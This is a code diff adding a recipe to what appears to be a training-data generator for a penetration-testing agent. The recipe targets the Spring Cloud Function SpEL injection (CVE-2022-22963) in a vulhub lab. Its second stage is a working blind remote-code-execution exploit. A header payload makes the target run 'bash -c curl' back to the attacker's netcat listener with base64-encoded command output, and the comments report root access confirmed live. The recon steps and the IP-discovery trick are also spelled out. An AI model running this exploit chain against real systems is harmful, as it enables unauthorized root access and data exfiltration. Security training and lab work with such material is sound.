@@ -1016,6 +1016,113 @@ TWO_STAGE_TEMPLATES = [
         ],
     },
     {
+        # spring_spel_rce_chain -- fourth "grind through vulhub one at a
+        # time" recipe (after wp2shell_full_chain, es_groovy_rce_chain,
+        # redis_lua_rce_chain). Targets spring/CVE-2022-22963 (Spring
+        # Cloud Function SpEL injection via the
+        # `spring.cloud.function.routing-expression` request header).
+        #
+        # A FOURTH distinct chain shape, and the first genuinely BLIND
+        # one in this file: confirmed live that `Runtime.exec(...)`
+        # returns to the caller immediately (Java doesn't block on the
+        # child process), so neither the HTTP response body (always a
+        # generic 500 JSON error, no reflected output) NOR response
+        # timing (tested directly: a payload running `sleep 5` came back
+        # in ~0.01s, same as a no-op payload) give any signal back to the
+        # attacker -- unlike es_groovy_rce_chain/redis_lua_rce_chain,
+        # where the exploited service reflects command output directly.
+        # This is a realistic scenario worth its own recipe rather than
+        # skipping: plenty of real RCEs are blind. The real technique
+        # (confirmed live) is an OUT-OF-BAND callback: `exec(new
+        # String[]{"bash","-c","curl http://<attacker-ip>:<port>/$(<cmd>
+        # |base64)"})` -- routing through `bash -c` (not a bare
+        # Runtime.exec(String), which never invokes a shell and so never
+        # expands `$(...)`) lets the TARGET's own shell run the real
+        # command and smuggle its base64-encoded output back to a plain
+        # `nc -lnp <port>` listener on kali-agent-box itself, via the
+        # callback request's own URL path. Confirmed live end to end:
+        # `id` came back as `uid=0(root) gid=0(root) groups=0(root)`.
+        #
+        # The listener's own IP is NOT hardcoded -- vulhub gives
+        # kali-agent-box a fresh IP on every new per-CVE docker network
+        # (same reasoning as the target's own IP), so baking one in here
+        # would break on the very next `vulhub_lab.py up`. Instead it's
+        # derived at RUN TIME from inside the exec container itself via
+        # `ip route get {target}`, which reports the kernel's own chosen
+        # source IP for reaching that target -- a general technique
+        # (not vulhub- or CVE-specific) worth reusing for any future
+        # recipe that needs its own reachable IP, not just this one.
+        #
+        # nuclei's tag for this CVE is `springcloud`, NOT `spring`
+        # (confirmed via `grep tags:` on the real installed template --
+        # checked before guessing, same discipline as
+        # es_groovy_rce_chain's/redis_lua_rce_chain's own tag checks).
+        #
+        # `condition_check` matches stage_1's `SPRING_CHECK:200` marker
+        # (the app's own harmless `/uppercase` endpoint, which doubles as
+        # this recipe's connectivity-verification step) -- same
+        # first-thing-printed reasoning as every other chain in this file.
+        "template_id": "spring_spel_rce_chain",
+        "verified": True,
+        "condition_check": "SPRING_CHECK:200",
+        "stage_1": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "echo \"SPRING_CHECK:$(curl -s -o /dev/null -w '%{{http_code}}' "
+                    "http://{target}:8080/uppercase -H 'Content-Type: text/plain' "
+                    "--data-binary test)\" ; "
+                    "timeout 30 nmap -sV -p8080 {target} "
+                    "| tee /tmp/spring_nmap.txt >/dev/null ; "
+                    "timeout 60 nuclei -target http://{target}:8080 -tags springcloud "
+                    "-silent | tee /tmp/spring_nuclei.txt ; "
+                    "searchsploit \"spring cloud function\" 2>&1 "
+                    "| tee /tmp/spring_searchsploit.txt"
+                ),
+            },
+        ],
+        "stage_2": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "MYIP=$(ip route get {target} | grep -oE 'src [0-9.]+' "
+                    "| awk '{{print $2}}') ; "
+                    "rm -f /tmp/spring_oob_id.log /tmp/spring_oob_whoami.log ; "
+                    "(nc -lnp 4446 > /tmp/spring_oob_id.log &) ; "
+                    "sleep 1 ; "
+                    "echo \"--- blind SpEL RCE via OOB callback: id ---\" ; "
+                    "timeout 15 curl -s -o /dev/null -X POST "
+                    "http://{target}:8080/functionRouter "
+                    "-H \"spring.cloud.function.routing-expression: "
+                    "T(java.lang.Runtime).getRuntime().exec(new String[]{{"
+                    "\\\"bash\\\",\\\"-c\\\",\\\"curl http://$MYIP:4446/\\$(id|base64)\\\""
+                    "}})\" "
+                    "-H \"Content-Type: text/plain\" --data-binary test ; "
+                    "sleep 2 ; "
+                    "head -1 /tmp/spring_oob_id.log | awk '{{print $2}}' "
+                    "| sed 's#^/##' | base64 -d 2>/dev/null ; echo ; "
+                    "(nc -lnp 4447 > /tmp/spring_oob_whoami.log &) ; "
+                    "sleep 1 ; "
+                    "echo \"--- blind SpEL RCE via OOB callback: whoami ---\" ; "
+                    "timeout 15 curl -s -o /dev/null -X POST "
+                    "http://{target}:8080/functionRouter "
+                    "-H \"spring.cloud.function.routing-expression: "
+                    "T(java.lang.Runtime).getRuntime().exec(new String[]{{"
+                    "\\\"bash\\\",\\\"-c\\\",\\\"curl http://$MYIP:4447/\\$(whoami|base64)\\\""
+                    "}})\" "
+                    "-H \"Content-Type: text/plain\" --data-binary test ; "
+                    "sleep 2 ; "
+                    "head -1 /tmp/spring_oob_whoami.log | awk '{{print $2}}' "
+                    "| sed 's#^/##' | base64 -d 2>/dev/null ; echo"
+                ),
+            },
+            {"tool": "run_metasploit", "commands": "search spring cloud function"},
+        ],
+        "variations": [
+            {"target": "172.27.0.2"},
+        ],
+    },
+    {
         # STRUCTURED run_medusa call in stage_2 -- medusa had ZERO
         # examples anywhere in the corpus before this template (one of
         # the 4 tools README's Known Gaps calls out by name). Genuinely
